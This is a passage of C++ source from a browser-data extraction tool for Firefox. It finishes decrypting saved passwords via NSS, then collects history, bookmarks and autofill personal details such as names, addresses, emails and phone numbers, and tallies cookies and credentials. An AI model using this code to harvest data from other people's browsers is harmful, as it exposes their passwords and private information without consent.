            password.passwordValue = decryptedPassword;
        }

        password.valid = true;

        this->Passwords.push_back(password); // Move the passwordBlob into the vector
    }
    
    this->UpdateTotalNumOfObjects(this->Passwords);
    FFDecrypt.NSSUnload(true);

    return this->Passwords;
}

/**
 * @brief Get all browser history entries that are stored in Mozilla Firefox's places.sqlite file.
 *
 * No data pulled is encrypted. Store it all in a struct of BrowsingEntry and add it to the vector called History.
 * @return Vector of the found browser history.
 */
browser_vector<BrowserEntities::BrowsingEntry> Mozilla::GetBrowserHistory()
{
    const char*   sqlQuery = "";
    sqlite3*      sqlDB    = nullptr;
    sqlite3_stmt* sqlSTMT  = nullptr;
    SQL_BLOB      sql      = {};
    
    sqlQuery = "SELECT id, url, title, visit_count, description FROM moz_places";
    sql = Browsing::SQLPrepareAndQuery(sqlQuery, this->CurrentBrowserInfo->fHistoryFile.c_str());
    sql.validate();
    
    sqlDB   = sql.db;
    sqlSTMT = sql.stmt;
    const char* titleInfo = "";

    while (sqlite3_step(sqlSTMT) == SQLITE_ROW)
    {                                                                                                   
        BrowserEntities::BrowsingEntry historyBlob;

        historyBlob.id = sqlite3_column_int64(sqlSTMT, 0);
        historyBlob.url = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 1);
        historyBlob.title = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 2);
        historyBlob.description = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 4);
        historyBlob.visitCount = sqlite3_column_int64(sqlSTMT, 3);
        historyBlob.valid = true;

        this->History.push_back(historyBlob);
    }

    sqlite3_finalize(sqlSTMT);
    sqlite3_close(sqlDB);

    this->UpdateTotalNumOfObjects(this->History);

    return this->History;
}

/**
 * @brief Retrieves browser bookmarks from the Mozilla Firefox browser.
 *
 * @return Vector of the found browser bookmarks.
 */
browser_vector<BrowserEntities::Bookmark> Mozilla::GetBrowserBookmarks()
{
    browser_vector<BrowserEntities::BrowsingEntry> browserHistory = this->GetBrowserHistory();

    const char*   sqlQuery = "";
    sqlite3*      sqlDB    = nullptr;
    sqlite3_stmt* sqlSTMT  = nullptr;
    SQL_BLOB      sql      = {};
    
    sqlQuery = "SELECT id, fk, title FROM moz_bookmarks";
    sql = Browsing::SQLPrepareAndQuery(sqlQuery, this->CurrentBrowserInfo->fHistoryFile.c_str());
    sql.validate();
    
    sqlDB    = sql.db;
    sqlSTMT  = sql.stmt;

    while (sqlite3_step(sqlSTMT) == SQLITE_ROW)
    {
        long bookmarkId = sqlite3_column_int64(sqlSTMT, 0);
        long bookmarkFk = sqlite3_column_int64(sqlSTMT, 1);

        for (auto& historyBlob : browserHistory)
        {
            if (historyBlob.id == bookmarkFk)
            {
                BrowserEntities::Bookmark Bookmark;
                
                Bookmark.id     = bookmarkId;
                Bookmark.fk     = bookmarkFk;
                Bookmark.title  = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 2);
                Bookmark.url    = historyBlob.url;

                Bookmark.valid = true;

                this->Bookmarks.push_back(Bookmark);

                break;
            }
        }
    }

    sqlite3_finalize(sqlSTMT);
    sqlite3_close(sqlDB);

    this->UpdateTotalNumOfObjects(this->Bookmarks);

    return this->Bookmarks;
}

/**
 * @brief Get any saved real-life information, which includes address, city, country, first-last name, full name, and much more.
 *
 * Get the information by searching the addresses list from autofill-profiles.json file.
 * No information is encrypted.
 * @return A vector representing all saved personal information.
 */
browser_vector<BrowserEntities::PersonalInfo> Mozilla::GetSavedPersonalInfo()
{
    std::string autofillFile = this->CurrentBrowserInfo->pProfileDefault + "/autofill-profiles.json";

    if (!utils::fs::exists(autofillFile)) {
        std::cerr << "ERROR: Invalid Autofill-Profiles.json Path. Found in The Default Profile Path." << std::endl;
        throw browser_error("Invalid (Autofill-Profiles.json) Path.", browser_error::ERR_INVALID_PATH);
    }

    std::string contents     = utils::ReadFileIntoString(autofillFile, true);
    JSON        jsonParsed   = JSON::parse(contents);
    JSON        addressField = jsonParsed;

    if (jsonParsed.find("addresses") != jsonParsed.end())
        addressField = jsonParsed.find("addresses").value();

    for (const auto& subField : addressField)
    {
        BrowserEntities::PersonalInfo info;

        info.addressLevel1       = subField.value("address-level1", "null");
        info.addressLevel2       = subField.value("address-level2", "null");
        info.streetAddress       = subField.value("address-line1", "null");
        info.countryAbbreviated  = subField.value("country", "null");
        info.linkedEmail         = subField.value("email", "null");
        info.givenName           = subField.value("given-name", "null");
        info.additionalName      = subField.value("additional-name", "null");
        info.familyName          = subField.value("family-name", "null");
        info.postalCode          = subField.value("postal-code", "null");
        info.phoneNumberNational = subField.value("tel-national", "null");
        info.organization        = subField.value("organization", "null");

        if (info.givenName != "null" && info.familyName != "null")
            info.fullName = info.givenName + " " + info.additionalName + " " + info.familyName;

        info.valid = true;
        this->SavedPersonalInfo.push_back(info);
    }

    this->UpdateTotalNumOfObjects(this->SavedPersonalInfo);

    return this->SavedPersonalInfo;
}

int Mozilla::NumOfFoundObjects(BrowserEntities::BrowserEntitiesTypes objectType, bool printInfo)
{
    int num = -1;
    try {
        if (objectType != BrowserEntities::ENTITY_NONE)
        {
            num = this->EntityTypeToCount.at(objectType);
            if (printInfo)
                std::cout << "[" << this->CurrentBrowserInfo->sBrowserNameString <<
                " ] : Total Saved Entities for Object Type (" << objectType << "): " << num << std::endl;
        }
        else if (printInfo)
        {
            std::cout << "Saved Info for Browser (" << this->CurrentBrowserInfo->sBrowserNameString << ")" << "\n";
            std::cout << "Total Cookies : " << this->TotalCookies << "\n";
            std::cout << "Total Passwords : " << this->TotalPasswords << "\n";
            std::cout << "Total Browser Entries : " << this->TotalHistoryEntries << "\n";
            std::cout << "Total Bookmarks : " << this->TotalBookmarks << "\n";
            std::cout << "Total Credentials : " << this->TotalSavedSensitiveInfo << "\n";
            std::cout << std::endl;
        }
        else
        {
            std::cout << "[NumOfFoundObjects()] : Incorrect Arguments." << std::endl;
            return -999;
        }
    }
    catch (std::out_of_range& err) {
        return -100;
    }

    return -200;
}